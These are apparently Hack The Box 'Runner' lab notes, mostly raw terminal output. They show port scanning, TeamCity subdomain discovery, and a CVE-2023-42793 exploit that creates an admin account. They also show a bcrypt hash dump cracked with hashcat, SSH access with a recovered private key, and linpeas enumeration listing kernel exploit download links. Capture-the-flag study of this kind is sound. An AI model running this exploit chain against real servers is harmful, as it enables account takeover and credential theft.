```
kali@kali ~> nmap -sC -sV -Pn 10.10.11.13
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-31 17:26 EDT
Nmap scan report for 10.10.11.13
Host is up (0.070s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://runner.htb/
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


![[runner-20240801004411464.webp]]



```
kali@kali ~> cewl http://runner.htb/ > wordlist.txt
```

```
kali@kali ~> ffuf -u http://runner.htb/ -H "Host: FUZZ.runner.htb" -w wordlist.txt -fs 154

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb/
 :: Wordlist         : FUZZ: /home/kali/wordlist.txt
 :: Header           : Host: FUZZ.runner.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

TeamCity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 597ms]
:: Progress: [286/286] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```


```
kali@kali ~/CVE-2023-42793 (main)> python CVE-2023-42793.py -u http://teamcity.runner.htb
[+] http://teamcity.runner.htb/login.html [H454NSec8255:@H454NSec]
```

```
kali@kali ~/C/CVE-2023-42793 (main)> ls
exploit.py  rce.py  README.md  requirements.txt  token
kali@kali ~/C/CVE-2023-42793 (main)> python exploit.py -u http://TeamCity.runner.htb

=====================================================
*                                                   *
*              CVE-2023-42793                       *
*        TeamCity Admin Account Creation            *
*                                                   *
=====================================================

Token already exists
Previous token deleted successfully
Run this command again for creating a new token & admin user.
kali@kali ~/C/CVE-2023-42793 (main)> python exploit.py -u http://TeamCity.runner.htb

=====================================================
*                                                   *
*              CVE-2023-42793                       *
*        TeamCity Admin Account Creation            *
*                                                   *
=====================================================

Token: eyJ0eXAiOiAiVENWMiJ9.UDNOd0ZHRGJpLWZCX1F0WGZqclBsakFqWl9J.ZjA3ZTM5NGQtOGQ5NC00NWFhLTk2MmItNjVjNWQxY2ZhMjVj
Token saved to ./token
Successfully exploited!
URL: http://TeamCity.runner.htb
Username: admin.nATq
Password: Password@123

```



```
kali@kali ~/CVE2023 (main) [1]> ./CVE-2023-42793_admin.sh http://TeamCity.runner.htb/ 80
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   431  100   431    0     0   2577      0 --:--:-- --:--:-- --:--:--  2596
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   563  100   431  100   132   2679    820 --:--:-- --:--:-- --:--:--  3496
<!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>login: Zenmovie password: Zenmovie

```


![[runner-20240801014226284.webp]]



```
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1722465258366, BCRYPT
2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
11, admin.2byz, $2a$07$XyqM.uX3m973JLb04.B.7OJTG0b9amt9P6GnRIKx1./kNACZXOFru, , admin.2bYZ@lol.omg, 1722465282906, BCRYPT
12, h454nsec2814, $2a$07$cg3YlN9puk4H.zJYQrZj2.G3Wpq0vOU9FIsTlSSflkW2Rg9a4ojyG, , "", 1722465479805, BCRYPT
```

\
for mathew

```
PS D:\hashcat-6.2.6> .\hashcat.exe testing.txt rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

hiprtcCompileProgram is missing from HIPRTC shared library.

OpenCL API (OpenCL 2.1 AMD-APP (3617.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #1: AMD Radeon RX 6600, 8064/8176 MB (6949 MB allocatable), 14MCU

The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].

Started: Thu Aug 01 01:45:05 2024
Stopped: Thu Aug 01 01:45:13 2024
PS D:\hashcat-6.2.6> .\hashcat.exe -m 3200 testing.txt rockyou.txt
hashcat (v6.2.6) starting

hiprtcCompileProgram is missing from HIPRTC shared library.

OpenCL API (OpenCL 2.1 AMD-APP (3617.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #1: AMD Radeon RX 6600, 8064/8176 MB (6949 MB allocatable), 14MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 61 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344387
* Bytes.....: 139921523
* Keyspace..: 14344387

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em:piper123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGL...eVo.Em
Time.Started.....: Thu Aug 01 01:45:36 2024 (10 secs)
Time.Estimated...: Thu Aug 01 01:45:46 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5673 H/s (8.64ms) @ Accel:2 Loops:16 Thr:16 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 52416/14344387 (0.37%)
Rejected.........: 0/52416 (0.00%)
Restore.Point....: 51968/14344387 (0.36%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:112-128
Candidate.Engine.: Device Generator
Candidates.#1....: rocky08 -> habagat
Hardware.Mon.#1..: Temp: 63c Fan: 58% Util: 55% Core:1817MHz Mem:  42MHz Bus:8

Started: Thu Aug 01 01:45:27 2024
Stopped: Thu Aug 01 01:45:47 2024
```




```
kali@kali ~/t/T/config> grep PRIVATE KEY . -r

grep: KEY: No such file or directory
./projects/AllProjects/pluginData/ssh_keys/id_rsa:-----BEGIN OPENSSH PRIVATE KEY-----
./projects/AllProjects/pluginData/ssh_keys/id_rsa:-----END OPENSSH PRIVATE KEY-----
```


```
kali@kali ~/t/T/config [SIGINT]> find / -name id_rsa 2> /dev/null
/home/kali/teamcity/TeamCity_Backup_20240808_182151/config/projects/AllProjects/pluginData/ssh_keys/id_rsa
/home/kali/.local/share/Trash/files/config/projects/AllProjects/pluginData/ssh_keys/id_rsa
```



make sure the permissions are `chmod 600`. if they are not then that will cause some trouble and ask for a password when in reality you dont need one

```
kali@kali ~> ssh -i 'stuff.ssh' john@10.10.11.13
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Thu Aug  8 07:26:04 PM UTC 2024

  System load:                      0.0615234375
  Usage of /:                       80.4% of 9.74GB
  Memory usage:                     44%
  Swap usage:                       0%
  Processes:                        221
  Users logged in:                  0
  IPv4 address for br-21746deff6ac: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.13
  IPv6 address for eth0:            dead:beef::250:56ff:fe94:203b

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

john@runner:~$
```



## PrivEsc


```
john@runner:/tmp$ ./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by github.com/PEASS-ng

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 5.15.0-102-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #112-Ubuntu SMP Tue Mar 5 16:50:32 UTC 2024
User & Groups: uid=1001(john) gid=1001(john) groups=1001(john)
Hostname: runner
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)



Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 5.15.0-102-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #112-Ubuntu SMP Tue Mar 5 16:50:32 UTC 2024
Distributor ID:	Ubuntu
Description:	Ubuntu 22.04.4 LTS
Release:	22.04
Codename:	jammy

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.9.9


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

╔══════════╣ Date & uptime
Thu Aug  8 07:31:11 PM UTC 2024
 19:31:11 up  2:05,  1 user,  load average: 0.35, 0.20, 0.13

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk
sda
sda1
sda2
sda3

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
/dev/sda2 / ext4 defaults 0 1
/dev/sda3 none swap sw 0 0
proc /proc proc remount,rw,hidepid=2,noexec,nosuid,nodev 0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
USER=john
SSH_CLIENT=10.10.14.24 46044 22
XDG_SESSION_TYPE=tty
SHLVL=1
MOTD_SHOWN=pam
HOME=/home/john
OLDPWD=/home/john
SSH_TTY=/dev/pts/0
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus
LOGNAME=john
_=./linpeas.sh
XDG_SESSION_CLASS=user
TERM=alacritty
XDG_SESSION_ID=89
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1001
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/tmp
SSH_CONNECTION=10.10.14.24 46044 10.10.11.13 22
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
/usr/bin/docker
/usr/bin/runc
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ Aliyun ECS? .......................... No
grep: /etc/cloud/cloud.cfg: No such file or directory
═╣ Tencent CVM? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No

curl: (6) Could not resolve host: metadata.google.internal


                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
[i] Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
Looks like /etc/fstab has hidepid=2, so ps will not show processes of other users
                 thread-self  cat/proc/thread-self//cmdline
                 self      cat/proc/self//cmdline
                 9602      /bin/sh./linpeas.sh
                 9600      sort-r
                 9599      /bin/sh./linpeas.sh
                 9597      seds,amazon-ssm-agent|knockd|splunk,&,
                 9595      seds,root,&,
                 9594      seds,john,&,
                 9587      /bin/sh./linpeas.sh
                 6477      /bin/sh./linpeas.sh
                 6319      -bash
                 6230      /lib/systemd/systemd--user

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 Not Found
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root    1136 Mar 23  2022 /etc/crontab

/etc/cron.d:
total 16
drwxr-xr-x   2 root root 4096 Apr  4 10:24 .
drwxr-xr-x 101 root root 4096 Apr 15 09:35 ..
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.daily:
total 32
drwxr-xr-x   2 root root 4096 Apr  4 10:24 .
drwxr-xr-x 101 root root 4096 Apr 15 09:35 ..
-rwxr-xr-x   1 root root  376 Nov 11  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  8  2022 apt-compat
-rwxr-xr-x   1 root root  123 Dec  5  2021 dpkg
-rwxr-xr-x   1 root root  377 May 25  2022 logrotate
-rwxr-xr-x   1 root root 1330 Mar 17  2022 man-db
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Apr  4 10:24 .
drwxr-xr-x 101 root root 4096 Apr 15 09:35 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Apr  4 10:24 .
drwxr-xr-x 101 root root 4096 Apr 15 09:35 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x   2 root root 4096 Apr  4 10:24 .
drwxr-xr-x 101 root root 4096 Apr 15 09:35 ..
-rwxr-xr-x   1 root root 1020 Mar 17  2022 man-db
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

SHELL=/bin/sh

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/grub-common.service could be executing some relative path
/etc/systemd/system/multi-user.target.wants/systemd-networkd.service could be executing some relative path
/etc/systemd/system/sleep.target.wants/grub-common.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                        LEFT          LAST                        PASSED               UNIT                           ACTIVATES
Thu 2024-08-08 19:39:23 UTC 7min left     Wed 2024-02-28 10:13:19 UTC 5 months 10 days ago fwupd-refresh.timer            fwupd-refresh.service
Thu 2024-08-08 20:56:51 UTC 1h 24min left Wed 2024-02-28 10:07:12 UTC 5 months 10 days ago apt-daily.timer                apt-daily.service
Thu 2024-08-08 21:06:13 UTC 1h 34min left Tue 2024-03-05 16:35:38 UTC 5 months 3 days ago  motd-news.timer                motd-news.service
Fri 2024-08-09 00:00:00 UTC 4h 27min left n/a                         n/a                  dpkg-db-backup.timer           dpkg-db-backup.service
Fri 2024-08-09 00:00:00 UTC 4h 27min left Thu 2024-08-08 17:26:07 UTC 2h 5min ago          logrotate.timer                logrotate.service
Fri 2024-08-09 01:47:05 UTC 6h left       Thu 2024-04-04 08:56:42 UTC 4 months 4 days ago  man-db.timer                   man-db.service
Fri 2024-08-09 06:04:48 UTC 10h left      Thu 2024-08-08 17:40:09 UTC 1h 51min ago         apt-daily-upgrade.timer        apt-daily-upgrade.service
Fri 2024-08-09 17:31:09 UTC 21h left      Thu 2024-08-08 17:31:09 UTC 2h 0min ago          update-notifier-download.timer update-notifier-download.service
Fri 2024-08-09 17:41:09 UTC 22h left      Thu 2024-08-08 17:41:09 UTC 1h 50min ago         systemd-tmpfiles-clean.timer   systemd-tmpfiles-clean.service
Sun 2024-08-11 03:10:48 UTC 2 days left   Thu 2024-08-08 17:26:47 UTC 2h 5min ago          e2scrub_all.timer              e2scrub_all.service
Mon 2024-08-12 00:26:17 UTC 3 days left   Thu 2024-08-08 17:50:08 UTC 1h 41min ago         fstrim.timer                   fstrim.service
Thu 2024-08-15 14:53:10 UTC 6 days left   Thu 2023-04-27 16:07:06 UTC 1 year 3 months ago  update-notifier-motd.timer     update-notifier-motd.service
n/a                         n/a           n/a                         n/a                  apport-autoreport.timer        apport-autoreport.service
n/a                         n/a           n/a                         n/a                  ua-timer.timer                 ua-timer.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/usr/lib/systemd/system/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/org/kernel/linux/storage/multipathd
/run/containerd/containerd.sock
/run/containerd/containerd.sock.ttrpc
/run/containerd/s/e73bf0677d4a30dac92eede230d9dab11ded408173c5f142d9455af9278da302
/run/dbus/system_bus_socket
  └─(Read Write)
/run/docker.sock
/run/irqbalance/irqbalance809.sock
  └─(Read )
/run/lvm/lvmpolld.socket
/run/systemd/fsck.progress
/run/systemd/inaccessible/sock
/run/systemd/io.system.ManagedOOM
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/resolve/io.systemd.Resolve
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control
/run/user/1001/bus
  └─(Read Write)
/run/user/1001/gnupg/S.dirmngr
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.browser
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.extra
  └─(Read Write)
